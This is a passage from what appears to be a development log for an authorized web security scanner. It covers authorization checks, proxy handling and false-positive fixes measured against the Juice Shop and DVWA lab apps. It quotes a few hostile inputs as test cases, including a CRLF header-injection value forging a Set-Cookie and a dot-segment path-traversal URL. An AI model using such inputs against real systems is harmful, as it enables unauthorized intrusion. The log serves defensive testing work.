— which is the outcome this increment was for. The scope/lifecycle suite passed
against the real scanners after each execution change (22 passed), and the
benchmark — the one failing acceptance check in §2 — now passes against a
stricter validator.

Method note worth keeping: three of the four items were reproduced by agents
working only from the code, and two of their analyses needed correcting on
material points. E-003's recommendation understated the cost (it called
`WSTG-INPV-07`'s mutating steps "four of nine" without noting they are the whole
of that case's detection), and E-002's status in this plan credited
`issued_payloads` with a guarantee it does not provide. Reproductions are worth
delegating; conclusions are worth checking.

**Increment 2 — make the release repeatable: DONE** (`eedb7e3`, plus the docs and
packaging commit). The CI collection defect was one line, as expected, and it was
not the important one: CI had never executed a single Docker-gated test, so the
lane's entire execution boundary — the sandbox, the egress proxy, the container
lifecycle — was verified only on one developer's machine. A one-line fix to a job
that was never going to run the tests anyway would have looked like progress.

E-006 produced the same lesson from the other direction. Every stale figure in it
had been written by someone who read the code instead of running it, so the
instructions were checked by following them from a **fresh clone with a fresh
virtualenv**, and two of my own new numbers were wrong within the hour:

- I quoted "a clean checkout reports 2167 passed, 35 skipped" from my working
  tree. A genuine fresh clone reports **2134 / 68** — the working tree has the
  gitignored `runs/` corpus and Docker, and a new operator has neither. The CI
  ratio guard had been calibrated against the wrong figure for the same reason.
- I then broke the skip breakdown down into categories summing to 44 under a
  total of 68, having counted distinct skip *locations* instead of summing the
  `SKIPPED [n]` counts pytest prints.

Both are now guarded by tests rather than by care: `tests/test_release_tooling.py`
asserts the README's breakdown sums to its own total, that its lane coverage
figure matches what `executable_test_cases` answers, and that no case marked
runnable in the catalogue table is one the parser refuses. The stale numbers this
increment corrected — `9 of the 29`, `1674 passed` — went stale precisely because
nothing ever asked them a question.

One further gap closed under "no unrelated operator files": the release evidence
E-005 introduced was untracked but **not ignored**, and `ERLIK_COVERAGE_REPORT`
given a bare filename lands next to the checkout. A local `pytest -m docker`
pointed at a client rather than the lab would have left a report carrying finding
metadata one `git add -A` from being published.

The audit found no operator or client data, no secrets, and nothing sensitive
anywhere in history. It did find ~36 tracked research artifacts (fine-tuning
scripts, training logs, recomputed statistics) that are evidence for the
evaluation rather than product; whether they ship is a decision for the owner,
not a packaging defect, and nothing was removed.

The repository requires human review and merge for scope/execution changes; no
automated self-merge is part of this plan.

**Increment 3 — demonstrate the next product benefit:** a vertical slice of E-007,
E-008, E-010, and E-011. An operator selects two lab identities, discovers a hidden
API operation, sees its coverage, reproduces a seeded authorization flaw, and opens
its evidence. The identity-isolation half of E-008 belongs in Increment 1 or 2
instead — §3 explains why it gates R0. Expand browser journeys and business
workflows after this works.

**Increment 7 — authorization compared across stages.** E-011's remaining half, and the
work Increment 6 named after stopping at its boundary: a lane stage carries exactly one
identity, so the `ownership` evaluator's three arms cannot meet inside one. So the question
is asked of what each STAGE recorded instead.

`inventory.cross_arm_authorization` applies the same four clauses to the stored run
evidence of two arms, exposed as `POST /sessions/{id}/authorization`. It **composes on the
isolation gate rather than repeating it**: `compare_arms` runs first, so an operation both
arms reached at different concrete URLs — the case the operation key introduces — is
refused instead of compared. Comparing responses from arms that issued different requests
measures the request.

Every clause was verified load-bearing by removing it, and the refusals are explicit
rather than silent: arms that are not comparable, an identity with no declared
`subject_id`, and a missing anonymous arm each return a named reason with an empty findings
list — and the payload says in as many words that a refusal is not a clean result. That
matters more here than anywhere else in the lane, because an empty list is exactly what a
caller wants to read as "no authorization flaws".

Measured end to end on Juice Shop, three stages, three identities, the real proxy
injecting each arm's material:

    arm jim        HTTP 200   asserted owner 1      (declared subject_id 2)
    arm admin      HTTP 200   asserted owner 1      (corroborates)
    arm anonymous  HTTP 401                         (refused, so not published)

    -> 1 finding, refused_because [], and no bearer token anywhere in the verdict

The safety asymmetry is unchanged and is why this was worth building at all: who each
caller IS comes from the operator via `Identity.subject_id`, and the asserted owner comes
from the target. A target can cost itself a finding and cannot manufacture one.

**Increment 8 — the privileged-function half, which completes E-011.** Object-level
authorization reads an owner out of the response, so the target says who a record belongs
to and the check only has to notice it is not the caller. A function has no owner to read:
`GET /api/Users` returns every user and nothing in the payload says who may ask. So the
operator declares a marker identifying privileged **data**, and
`inventory.cross_arm_privileged_function` asks three things of the stored evidence — the
marked data reached the privileged arm, it also reached the unprivileged arm, and an
anonymous arm asked for it and did not receive it. Exposed as
`POST /sessions/{id}/privileged-function`.

It generalises the sibling check rather than copying it: the stage/evidence join both need
is now `inventory.arm_responses`, in one place, so a second check cannot drift from the
first.

**The status-shaped rule was measured and rejected, not assumed away.** Over 16 Juice Shop
endpoints with three real arms:

    endpoint                              admin  cust  anon   status rule   marker rule
    /api/Users                             200    200   401    report       report
    /api/Users/1                           200    200   401    report       report
    /rest/user/authentication-details      200    200   401    report       report
    /rest/basket/1                         200    200   401    report  FP   -
    /api/Complaints                        200    200   401    report  FP   -
    /rest/order-history                    200    200   500    report  FP   -

    -> 3 findings of 16 checked, refused_because [], 0 false positives,
       and neither the marker nor a bearer token anywhere in the verdict

`/rest/order-history` is the one that settles it: each arm received its own orders, which
is indistinguishable from a crossing by status alone.

The anonymous clause carries more weight than expected. **Three of the first four
candidates measured are public, and two of them have `admin` in the path** —
`/rest/admin/application-configuration` and `/rest/admin/application-version` answer 200 to
anybody, as do `/api/Feedbacks` and `/api/Recycles`. A path-name heuristic reports all
four.

The marker also removes the need for a denial list: Juice Shop refuses with HTTP **400**
`{"status":"error","data":"Malicious activity detected"}` and DVWA with HTTP **200**
`{"result":"fail","error":"Access denied"}`, and neither body carries the privileged data.
The same clause covers an expired session, which receives the anonymous response.

DVWA could not supply the positive control and was measured before being set aside: it
offers no level that is authenticated-but-unauthorized — at `security=low` its authbypass
module serves the user table to anybody carrying the level cookie, which is missing
authentication rather than broken authorization, and at `impossible` it enforces correctly.

Twelve clauses and sub-clauses were each removed to confirm a test fails without them.
Four initially did not, and each exposed a real gap: a control where the marker named the
*unprivileged* arm's own data, a marker echoed by a 400, a marker present only in the
response headers, and a header-only capture with no body at all. One of the tests written
for this increment **passed for the wrong reason** — it patched a stored capture under a
stage id nothing reads, so the clause it claimed to cover was never exercised; and two
fixtures built an "echo" with `json.dumps`, which escapes the marker's own quotes, so the
marker was absent from bodies meant to contain it. The same escaping made the
marker-not-echoed assertion unable to fail. All four are the suite's recurring defect
shape, found by ablation rather than by reading.

There is deliberately **no catalogue case** for this. A lane stage carries one identity, so
a case naming a privileged arm and an anonymous arm has no way to have either — the same
reason a lane-runnable `WSTG-AUTHZ-04.2` was written and then deleted in Increment 3.

**An adversarial pass over the foundation found five defects, four of them in shipped
code.** The function-level check was going to rest on them, so they were fixed first.

*A target could assert its own status.* `_http_status_ok` was
`re.search(r"^HTTP/\S+\s+2\d\d", out, re.MULTILINE)` — the whole capture, and the body
is part of the capture and is written by the target. A 403 whose body contained a line
`HTTP/1.1 200 OK` read as a success. `detection.py` had the same defect in its own copy
(`findall(...)[-1]`). That primitive is under the `ownership` and `idor` evaluators and both
cross-arm checks, so a target could assert that its own refusal had succeeded — the one
direction the safety asymmetry exists to make impossible. Both lanes now share
`orchestrator/http_capture.py`, which reads a status only from the first line of a header
block, walking forward and advancing only across 3xx blocks. `curl -i -L` prints every
header block and only the final body, so redirect chains still work and the body is
unreachable.

*Two arms could be compared without having issued the same request.* The evidence reader
keyed a response by the run's declared `target.url` and took the FIRST step with output.
So a run whose steps were `[login 200 carrying the owner, read_as_caller 403]` reported the
LOGIN's body as the caller's access, a refused read became a finding, one arm's body could
come from a different test case entirely, and two artifacts for one request let row order
decide — which both invents findings and loses real ones. `arm_responses` now keys by
`(url, test_case, step)`, drops keys whose captures disagree with an `ambiguous_evidence`
refusal, and both checks intersect with the endpoint rows `compare_arms` actually gated, so
a finding cannot name a URL nothing compared.

*A named anonymous arm need not have run.* `service.register` creates an anonymous stage
only via `config.identity_ids or ["anonymous"]`, so a two-identity run has none — and an
operator passing the lane's own literal name for it got findings with the load-bearing
clause never evaluated. The route's model also accepted `anonymous=""`, which named no arm
and then passed an `is None` presence check. Both refuse now.

*Publication was judged by a VALUE the target controls.* The object-level clause compared
the anonymous arm's owner field to the caller's, so a target that retyped `1` as `"1"` or
omitted the field escaped it — a no-privilege-needed way to manufacture a HIGH finding on
fully public data. It now asks whether the anonymous arm RECEIVED the object, which is what
the `ownership` evaluator already did.

*And the reflection gate missed a form encoding.* `unquote` leaves `+`, so
`?name=Vulnerability%3A+Reflected` did not match the marker `Vulnerability: Reflected` that
DVWA reflects three times into that page. `unquote_plus` now.

**The rule needed a fifth clause, and the lab proved it.** `GET /rest/basket/2` is jim's
OWN basket and the administrator can read it too, so a marker naming jim's own data is
present in both arms while anonymous is refused — every clause satisfied, nothing wrong.
No rule reading only responses can separate that from a crossing, because the difference is
ENTITLEMENT. `Identity.may_access` is where the operator says so; it had been validated and
read by nothing, and this is its first reader. It is read as an open-world suppression — a
declared path removes a finding, an empty declaration removes none — because read as a
closed-world allowlist it manufactures them, worst of all for the anonymous arm, whose list
is empty.

**Increment 9 — an arm must be the arm it claims to be.** The two defects Increment 8 named,
plus five more of the same shape that an adversarial pass found while attacking them. Every
one was a measured false positive, not a missing feature.

**The anonymous arm was testing a different application.** A stage's identity is `None` for
the anonymous arm and the proxy injects nothing, while DVWA's security level is a cookie the
CALLER chooses. Measured through the real proxy on the authbypass endpoint: 273 bytes with
`security=low`, 41 without. `AssessmentConfig.application_cookies` is injected on every arm —
each identity, the anonymous one, and the liveness control. Measured end to end with real
admin and gordonb sessions, through the real proxy: **1 false positive before, 0 after**, on
data DVWA hands to anybody who sets a cookie. It is a false positive in code shipped one
increment earlier.

Two things about it were wrong in the first draft and both were caught by measurement. It had
no ORIGIN fence — a cookie declared for `localhost:8081` was measured landing on
`localhost:3000`, and no cookie `domain` can express a port, so `target_origin` is required and
compared whole. And it gave the IDENTITY precedence: DVWA answers every request with
`Set-Cookie: security=impossible` and `login.py`'s jar absorbs it, so an identity captured by
erlik's own credential flow carries `impossible` — declaring `security=low` would either have
done nothing or, in the first draft's collision rule, aborted the entire assessment. The
declaration outranks the identity, and the override is recorded rather than silent.

What it guarantees is UNIFORMITY, not that the values are not credentials — anything every arm
carries cannot distinguish arms. On a run with no identities there is one arm and no
differential, so every stage records `metadata.application_configuration` and the published
configuration keeps the names and origins while redacting the values.

**Liveness is now differential.** `expected_status` defaults to 200, so an identity whose
check URL was the target origin passed carrying nothing — and its arm was then effectively
anonymous while every comparison believed it was a distinct identity. The rule is the one
`login._verify` already learned: the identity's response satisfies the assertion AND a control
with the identity dropped does not. Scored over 11 rows captured through the real proxy, the
old rule is wrong on 3 and the new on 0; an independent 41-row corpus put the old at fp=11 and
the new at fp=1, and ablating the differential returned it to 11. `indiscriminate`,
`check_is_unstable` and `control_unavailable` are `failed` rather than `needs_auth`, because
`run()` resumes `needs_auth` and resuming cannot fix a check that never tested a credential.

Three holes in it were measured and closed or named. A control the EGRESS PROXY refused read
as a discriminating control, because `satisfies` opens with `not blocked` — certifying an arm
carrying nothing, the defect the rule exists to remove resurrected by its own guard. A
non-deterministic assertion certified an empty arm in 18-24% of trials on Juice Shop's
`/metrics`, and re-sampling plateaus rather than converging (24%, 6%, 10%, 8% for k=1,2,3,5),
so two samples now REFUSE a check whose assertion they disagree about instead of trying to
out-sample it; a residual remains for an assertion that is mostly stable. And the target can
supply the discriminator — Juice Shop's two `/api/Users` 401 bodies differ on whether a
credential was PRESENTED, not whether it was valid — so `Identity.check` must now assert a
**2xx**, which also removes an unreachable 3xx assertion the worker's redirect-following made
invisible.

**THE AUTHORIZATION WORK COULD NOT RUN ON ANY REAL ASSESSMENT.** `register` built its arms as
`config.identity_ids or ["anonymous"]`, so an anonymous arm existed only when NO identity was
configured, and `preflight` rejects `"anonymous"` as a handle. Measured on a two-identity
registration: 4 stages, 2 arms, no anonymous one, both cross-arm checks refusing with
`anonymous_arm_did_not_run`. Increments 7 and 8 built those checks and their tests wrote the
anonymous stage row into the database BY HAND, so the suite was green on a feature nothing
could reach. `anonymous_arm` now defaults to true, and the new tests go through the real
`register`, which is the only thing that would have caught it.

**One root cause accounted for four more false positives: erlik's OWN refusal read as the
target's.** `deterministic.curl_request` deliberately substitutes a status-line-less sentence
when the proxy refuses a probe, and a timeout arrives as zero bytes — and every "the anonymous
arm did not receive this" clause passed on that silence. An absence is only evidence when
something was there to be absent from. The lane's own audit recorded 29 of 60 probes refused
in one measured run, so this was the common case.

    cross_arm_privileged_function on /rest/products/1/reviews   FINDING, refused_because []
    the `idor` evaluator, from curl --max-time 0.001 (0 bytes)   HIGH, confidence confirmed

`confirmed` is the grade that marks a finding verified on a client's tracker. Both cross-arm
checks and both in-case evaluators now require `http_capture.answered`, whose own guard is the
`X-Erlik-Blocked` header rather than a sentence prefix — the first draft's prefix check was
UNREACHABLE, since a capture starting with `[erlik]` never parses as a response anyway, and an
unreachable guard implies a protection that is not there.

Two more in the same family. `cookie_attributes` parsed `Set-Cookie` out of the whole capture,
so a reflected `?name=%0ASet-Cookie:+JSESSIONID%3Dforged%0A` produced a MEDIUM about a cookie
the server never set — on WSTG-SESS-02, the one case runnable without `active`, which runs
against every discovered URL. `_response_headers` existed in that file for exactly this reason
and that call did not use it. And `SecurityAssertion` emitted HIGH `confirmed` findings from
one response with no control: measured firing on a marker the operator put in the URL and the
target echoed, and on a DVWA refusal followed to `login.php` whose finding named
`/vulnerabilities/exec/` while its evidence was the login page. Both are refused now, the
decision is extracted as `adapters.assertion_verdict` so it can be tested at all, and its
`basis` says in the finding what one arm can establish.

**Named rather than fixed, with the reason.** `SecurityAssertion` still has no control arm, so
an operator naming a marker a catch-all route happens to serve (Juice Shop answers
`/administration` with index.html, which contains "Juice Shop") still produces a finding; no
single response can detect that, and giving it a second arm is a design change, not a clause.
`interactsh.py`'s `ok = not response.get("blocked")` records a 404 or 403 probe as a callback
in flight — measured at the predicate, inferred end to end, and it costs a lost finding rather
than a false one. `infer_from_scripts` mines a body without checking its status, and the
rendered pass records requests ISSUED rather than answered; both were unmeasured by the agent
that raised them and are unverified here.

**Thirty-one clauses were each removed to confirm a test fails without them.** Eight initially
did not. Three of those were masked by a test of mine that was ALREADY FAILING — an ablation
"caught by" a broken test is caught by nothing — and one ablation produced a SyntaxError rather
than a test failure, which is the same trap as the Increment 5 negative control that left an
IndentationError. Two more clauses turned out to be genuinely unreachable and were rewritten
rather than kept.

**Increment 10 — run one.** Increment 9's worst finding was a feature that could not run in
production while its tests were green, so the way to find the next one is to stop writing
fixtures and run a real assessment: `service.run()`, three arms, against both lab
applications. That had never happened — the anonymous arm only started being registered an
increment earlier. It found three more reasons the authorization work produced nothing, and
none of them was reachable from a unit test.

**A refusal by erlik's own proxy, read as an expired credential, halted the run.** The admin
arm crawled 63 Juice Shop endpoints under `max_urls=60`, so the stage's CLOSING liveness check
was the 61st distinct URL; the proxy refused it, `satisfies` opens with `not blocked`, and the
stage was recorded "authentication expired during stage; replace credentials and resume" about
a credential that was fine. `run()` then broke out of the loop, costing the other identity and
the anonymous arm, which has no credential to expire. This is the third instance of one
pattern — our own refusal read as the target's — and it sat one line above the control version
fixed in Increment 9. A blocked probe is now its own verdict, and erlik's liveness traffic no
longer spends the operator's URL budget: `max_urls` bounds exploration of the TARGET, and a
probe of one declared, scope-checked URL is not exploration.

**One incomparable operation discarded every comparable one.** 37 of 37 Juice Shop operations
seen by both arms, roles declared correctly, both checks returning nothing — because THREE
`/socket.io/` operations carry a per-connection `sid` and a cache-busting `t`. Thirty-four
comparable operations thrown away for three websocket handshakes. The two per-operation
conditions now count instead of refusing the session.

My first fix for that returned the concrete excluded URLs, which carry the companion VALUES
`compare_arms` deliberately withholds — a single-use `user_token` reached the payload, and an
existing test caught it. Then the subtraction turned out to be unnecessary at all, because
`arm_responses` keys evidence by the request with the URL included, so two arms are only ever
compared on the identical URL. Verified by removing it and re-running both real sessions:
identical results. Reported, not subtracted.

**The evidence key omitted the parameter**, so `WSTG-INPV-05.2` probing `username` and
probing `password` on one DVWA URL collapsed into one key, their differing captures read as
self-contradiction, and `ambiguous_evidence` refused all 29 comparable operations. Every
fixture had used `parameter: ""`. The parameter is part of the request and is now part of the
key.

**Zero findings was then verified to be an honest zero, not a vacuous one.** On DVWA two real
keys carry a finding's exact structure (admin 2xx, low 2xx, anonymous ANSWERED non-2xx), and
running the shipped check over the real lane evidence fires on a marker present in those
captures and not on one absent from them. It also surfaced a duplicate — two catalogue cases
fetched `http://dvwa/` and the check emitted two byte-identical findings — so it is one
finding per operation now.

**Two structural limits, measured, neither a defect.** DVWA's anonymous arm discovered 4
endpoints against the identity arms' 31 and 32, because DVWA redirects an unauthenticated
caller away from its entire surface, so the anonymous clause is unevaluable for the
authenticated surface and the checks skip rather than conclude. And the cross-arm checks read
whatever the selected catalogue cases happened to fetch — **none of the runnable cases reads a
privileged object as each identity**, so the authorization work is opportunistic. A case that
fetches each discovered endpoint as each arm is the natural next piece of work, and it is what
would make these checks systematic rather than dependent on what a run happens to leave behind.

**Increment 11 — the checks get an input.** Increment 10 ended by naming the gap: the cross-arm
authorization work reads evidence catalogue cases leave behind, and none of the runnable cases
reads a discovered endpoint as each identity. `ERLIK-SURFACE-READ` is one plain GET per
discovered endpoint per arm, recorded as evidence and evaluating NOTHING. Not a WSTG case: one
read by one identity cannot tell privileged data from published data, and an entry whose
evaluator can never fire is the vacuous-case shape this project keeps deleting.

**It closes the arc.** On a real three-arm assessment of Juice Shop through `service.run()`:

    privileged-function   findings=1   checked=213   refused_because=[]
      FINDING http://juice-shop:3000/api/Users  [customer -> admin]

213 operations compared where the same run without the read compared 34, and the finding is the
violation first measured BY HAND in Increment 8. The lane's first authorization finding produced
end to end, from discovery to verdict.

**Where it spends a budget it cannot finish mattered more than the probe.** `seeds()` returns
`ORDER BY url`, so the share went alphabetically: measured on a real 63-URL inventory at
`max_urls=60` with four cases (share twelve), the twelve were the homepage, a woff2, two JSON
APIs, a favicon, `assets/i18n/en.json` and six product JPEGs, with the first `/rest/` URL at
rank 24. A static asset cannot differ by identity, so it cannot carry a differential; sorting
those last took the share from 3 of 12 API URLs to 10 of 12. A reordering, not a filter.

A draft also deduped fragments — `/#/about` and `/` are the same request, verified as an
identical 3748 bytes — and that could never fire, because `seeds()` already defragments every
candidate. Measured: 0 of the 86 URLs read carried a fragment. Removed, for the third time this
arc: code that cannot fire implies a protection that is not there.

**Two declarations are the floor, not a tuning choice.** An adversarial pass scored the shipped
checks over three arms of the full violation set: all four recovered, zero false positives over
ten negative controls, but only as the union of a function marker (`"role":"admin"` →
`/api/Users`, `/api/Users/1`, `/rest/user/authentication-details`) and an owner field
(`data.UserId` → `/rest/basket/1`). No single marker reaches 4/4 — an exhaustive sweep of 15,001
substrings of the admin record found 826 that do, and every one is a seed-data timestamp or JSON
punctuation. Three of the four are one dataset; the BOLA is an object whose body carries no
privileged attribute, only an owner field. The marker is load-bearing: `"status":"success"`
reports 7, of which 3 are declared negative controls.

**A PLAIN GET IS NOT ALWAYS A READ.** Measured on Juice Shop: a bare `GET /rest/captcha/` runs
`CaptchaModel.build().save()` and rotates the live captcha (captchaId 51 then 52); `GET
/rest/saveLoginIp` updates the user row; five static PNGs under `/assets/public/images/padding/`
flip challenges to solved on retrieval; `GET /rest/web3/nftMintListen` makes the TARGET open a
websocket to a public host. `state_changing: false` is about the METHOD and cannot express any
of it. What bounds the exposure is the input: `seeds()` returns only this arm's own endpoint
rows, minus script-inferred routes and form-synthesised actions, so every URL read was already
requested by this arm's own crawler — verified, 0 of 86 absent, and `/rest/captcha/` was
discovered by the browser pass, so its write predates the probe. The read changes the volume of
requests, not the class of side effect the lane already causes. `surface_read: false` turns it
off.

**Also fixed: the checks under-reported what they could not compare 28:1.** Measured on a real
run, each arm held evidence for 130 URLs, the gated intersection was 46, and the only visible
trace was `checked=46` — the 84 missing were all `/socket.io/?…&sid=…`, correct to drop and not
something an operator should infer from a subtraction. `urls_not_shared_by_both_arms` now says
it.

**Known and not addressed.** DVWA's `/vulnerabilities/csrf/?Change=Change` is permitted by the
product's DEFAULT `excluded_paths`; it is safe today only because the form-synthesis guard
withholds it once discovered, which an independent pass verified with a positive control — but
in the one real DVWA run no form row for it existed, so that guard protected nothing and the
safety rested on a crawler omission. And katana mines junk paths out of JS bundles (`/Edge/`,
`/Trident/` are browser-detection regex fragments), which a richer crawl fills the read's share
with; that is discovery quality, not read ordering.

**Increment 12 — the lane discovered collections and never instances.** Object-level
authorization lives on instances. Measured on a real three-arm Juice Shop run: `/api/Users` and
`/api/Cards` had endpoint rows, `/api/Users/1` and `/rest/basket/1` had none, and only 5 of 234
discovered URLs contained a numeric path segment. The surface read's own evidence already named
the instances — 15 collections carrying integer row ids — so pass two of the read derives
instance URLs from the collection bodies pass one captured.

**This is the sharpest hazard in the threat model, deliberately entered.** "A discovered value
fed back into a probe lets the target choose the evidence" is the rule a planted
`<a href="/search?219359=1">` earned. So `safe_object_id` is a whitelist of SHAPES — a bounded
run of ASCII digits or a canonical UUID, explicit `[0-9]` because `\d` matches Arabic-Indic `١`
and fullwidth `１` — and the URL is REBUILT from the collection's own scheme, netloc and path
with query and fragment dropped, so no id can move the request or escape the path. An
independent implementation that concatenated instead produced
`/api/Challenges/?name=Score%20Board/74`, still the list route, 200 to everybody.

And the gate is stated for what it is: across all 15 collection bodies, 889 rows, every `id` an
integer, **0 rejected**. A safety gate against a hostile target, not a precision filter.

**The important result is what the object-level check must NOT be shown.** On a derived instance
the asserted owner IS the path segment the lane chose — `GET /api/Users/1` answers
`{"data":{"id":1,…}}`, so `owner_field: data.id` reads back the lane's own input. An adversarial
pass scored it across four declarations on real captures: derivation took
`cross_arm_authorization` from 0 findings to 1 true positive and SEVEN false positives, precision
over all declarations from 1.00 to 0.42, and porting the reflection clause removed all seven
ALONG WITH the only true positive. There is nothing for that check to keep on a URL the lane
invented, so derived URLs are excluded from it. The worst FP names itself: `/api/Feedbacks`
answers 200 to anonymous while `/api/Feedbacks/1` is 401, because only the instance route is
guarded — so every clause fires on content the anonymous arm's own collection evidence shows is
published.

`cross_arm_privileged_function` is unaffected and gains, because its marker is the OPERATOR'S
and no choice of URL satisfies it. The safety asymmetry one level down. Measured end to end on a
three-arm Juice Shop assessment through `service.run()`:

    privileged-function   findings=2   checked=225   refused_because=[]
      FINDING /api/Users     [customer -> admin]
      FINDING /api/Users/1   [customer -> admin]
    object-level          findings=0   checked=206

Two of the four known violations, zero false positives over 225 compared operations.

**Unlike pass one this issues requests nothing crawled**, so it also requires `active` and has
its own switch, and the share is SPLIT not doubled — pass two takes a third, so `max_urls` keeps
meaning what the operator set. Candidates go breadth before depth: depth-first dropped exactly
`/api/Users/2` and `/api/Users/3` from 30 candidates against a share of 28, because `/api/Users`
sorts last.

**Two premises of mine were wrong and an agent corrected both.**
`/rest/user/authentication-details/` — with the trailing slash my own query missed — WAS in every
arm's endpoint rows, non-static, at position 105 of 200; it was lost to the URL BUDGET, not to
the collection/instance gap. And `/rest/basket/1` is not recoverable by derivation at all: no
collection lists baskets and `/api/BasketItems` carries `BasketId` as a foreign key rather than
as its rows' id. 4 of 4 is out of reach either way.

**Limits measured and recorded, not papered over.** Classic BOLA — each arm seeing only its own
ids — is out of reach, because an arm derives from its own listing and never names another
principal's object; `/api/Users/3` is a real violation the check declines on purpose, so BOLA
recall is bounded by the number of DECLARED IDENTITIES. DVWA has no derivable collections: of 50
2xx responses exactly 2 are JSON, both bare arrays, and the per-user one has no `id` key and is
served as text/html — and its derived instance is not an instance route at all, since Apache
takes the extra segment as PATH_INFO and `get_user_data.php/1` returns the entire collection
byte-identical. The feature is API-only in practice.

**And the first clean run of it produced NOTHING, which found the last piece.** An arm derives
from collections IT can read, and the anonymous arm is refused exactly the interesting ones:
measured, the only derived instances all three arms shared were of PUBLIC collections, while
`/api/Users/1` was derived by both identity arms and by neither the anonymous one — so the check
skipped it, correctly, because clause 3 requires the anonymous arm to have ASKED. The anonymous
arm is now handed the instances other arms derived; it runs last, so the rows exist. It cannot
invent a finding, because an anonymous 2xx SUPPRESSES one.

That also reverses what looked like the obvious economy. 10 of 15 collections are anonymously
readable and a third of derived probes hit routes denied to everyone, and gating derivation on
"was the COLLECTION refused to the anonymous arm" was measured to cut 36 probes to 10 while
keeping the true positive — but the gate is backwards once the anonymous arm needs the
instances: the collections it cannot read are precisely the ones worth deriving from. The other
candidate signal, "does the collection differ between the arms", is UNSOUND for a different
reason — `/api/Users` is byte-identical between admin and jim and is exactly where the real
violation is.

**Two safety findings from the adversarial pass changed the design.** A dot segment in the
COLLECTION'S own path escaped everything: measured on the wire with the pinned worker curl,
collection `http://h/d22/x/../..` produced the recorded URL `/d22/x/../../7` while apache logged
`GET /7` — so the request was neither under the collection path nor the URL written into the
endpoint row and the evidence key, and `EgressPolicy.check` matches `excluded_paths` and
`ends_the_session` against the RAW path. The id gate was irrelevant to it; the id stayed `7`. A
collection whose path is not already what curl will send now derives nothing.

And derivation is OFF BY DEFAULT. The surface read can say every URL it fetches was already
fetched by this arm's crawler, so it changes the VOLUME of requests and not the class of side
effect. A derived instance cannot say that, and on this project's own primary lab app the first
derived reads land on writes: `GET /rest/memories/1` and `GET /rest/products/search/1` both 500,
Juice Shop's `errorHandlingChallenge` fires on `statusCode > 401`, and `challengeUtils.solve`
runs `challenge.save()`. Verified in the container's own source. That is an operator's decision,
not a default.

**Increment 13 — half the read budget bought the same document twice.** Everything the lane does
is rationed by `max_urls`, and the coverage report from Increment 12 said 461 of 566 pairs were
never tested. Measured on a real three-arm Juice Shop run: of 86 surface reads, 37 returned a
response the lane had ALREADY SEEN, absorbed into three survivors — `/`, `/api/Feedbacks` and
`/api/Quantitys`. The 36-strong group is the single-page application's shell, which its server
returns for any route it does not know, and it included `/Edge/` and `/Trident/` — browser
detection regex fragments katana mined out of a JavaScript bundle.

`inventory.indistinct_urls` maps each URL that answered with a response an earlier URL already
gave to the URL that gave it first. "The same response" is the STATUS, the STABLE HEADERS and the
BODY. One rule folds in the ordinary case too: `/api/Feedbacks` and `/api/Feedbacks/` are
separate rows with identical bodies.

**Three clauses came from measurements that would otherwise have made it wrong.** An EMPTY body
is never evidence — on DVWA six genuinely different static files grouped together because the
captures came from an OPTIONS probe and every body was 0 bytes, and pruning them would have
discarded four real assets. The HEADERS are compared, because `WSTG-SESS-02` decides entirely on
`Set-Cookie` and `WSTG-CONF-06` on `Allow`; measured, including the stable headers changed
nothing (35 groups and 37 pruned either way), so that blind spot closed for free. And only 2xx is
compared, because every refusal looks alike.

**Only the no-parameter cases are pruned.** A parameter probe is a different request from the
bare read that grouped. Measured, no pruned URL carried a discovered parameter at all — but the
safety is structural rather than resting on that.

**The first framing of the win was wrong and the measurement corrected it.** A case takes its
SHARE of the budget, so a shorter eligible list changes WHICH urls it picks, not how many. Two
otherwise identical runs:

    before   WSTG-INFO-03 probed 21 urls, 11 of them a response already seen  (52%)
    after    WSTG-INFO-03 probed 21 urls,  0 of them a response already seen

Same 21 probes, every one now on a distinct response. The other half is the report: `coverage()`
gained an `indistinct` state, so a URL with nothing left to test no longer reads as `not_run`.
Endpoint rows are untouched, so the authorization comparison is unaffected.

**Increment 14 — the last `confirmed`-from-one-response path, and two corrections to Increment
13.** `SecurityAssertion` emits HIGH `confidence="confirmed"` from one response to one identity.
Two of its three measured ways to fire on nothing were closed in Increment 9; this is the third.
A single-page application serves its shell for every route its server does not know, and that
shell carries the product's own name — measured, `/administration`, `/accounting`, `/Edge/`, `/`
and a path that cannot exist all produce ONE response signature on Juice Shop, so "must not see
'Juice Shop' at /administration" was a HIGH confirmed finding made out of index.html.

The control is a path that cannot exist: whatever the application answers there is its generic
response. `adapters.generic_response` fetches one per origin at a path derived from the session
id — stable within a run, unpredictable across them. It discriminates rather than
blanket-refusing: `/api/Users`, `/api/Users/1` and `/rest/user/whoami` all differ from it, and on
DVWA `/` differs while `/administration` does not. A refused or errored control is not a control,
because returning erlik's own 403 would suppress every assertion on that origin. The comparison
reuses `worker_response_signature`, so there is one rule for "the same response" and not two.

**Increment 13's adversarial pass landed after it was committed and found two real things.** Its
two BLOCKING claims — that pruning removes DVWA's LFI and XSS pairs — do not hold against the
implementation: the parameter cases build their targets from `parameters_by_url` and never consult
the pruned set. I verified that by reading AND by building the agent's exact scenario as a test
whose ablation (extending pruning to the parameter branch) fails it. But the pass was right about
the survivor: on DVWA the junk spellings `/./vulnerabilities/fi/` and `//vulnerabilities/fi/` are
byte-identical to the real URL and SORT FIRST, so first-spelling-wins kept a junk spelling and
reported it as the representative. So the most canonical spelling now survives
(`inventory.canonicality`), and a parameter carrier outranks any spelling via a `keep` set.

Writing that introduced a defect of its own, caught by an existing test: `/` splits to
`["", ""]`, so counting every empty segment penalised the ROOT and handed the survivor slot to
`/about` — and `/` is the one member of the 36-strong shell group where the path-appending cases
find anything. A trailing slash is not a junk segment.

Fourteen clauses ablated across both pieces, all fourteen measured. One was dead code and was
removed rather than kept: a filter protecting `keep` URLs from being reported as duplicates,
which `outranks` already guarantees.

**Increment 15 — the authorization findings were never findings.** Nine increments built the
cross-arm checks, a real three-arm Juice Shop run produced two true positives and zero false
positives, and they existed only as the body of an API response. Measured:
`integration_findings` held NINE rows, all from catalogue cases, while the checks reported
`/api/Users` and `/api/Users/1`. So the findings route omitted them, the DefectDojo export omitted
them, triage could not mark them, and `coverage()` never credited those operations. The lane threw
away the only findings it was most sure of.

`inventory.authorization_findings` builds the rows and both routes record what they find.
Persisting goes through `persistence.persist_findings`, split out of `persist_result` so the
triage-merge rule has one implementation — so a re-run updates one row and an operator's
`false_positive` survives. Measured on the real run: 9 findings became 11, and persisting twice
left 11.

The MARKER never travels ON THIS PATH: the finding carries the digest the check already
computed, and its evidence states what each arm RECEIVED rather than quoting it, because the
obvious evidence string would quote the response around the marker — which is the private data.
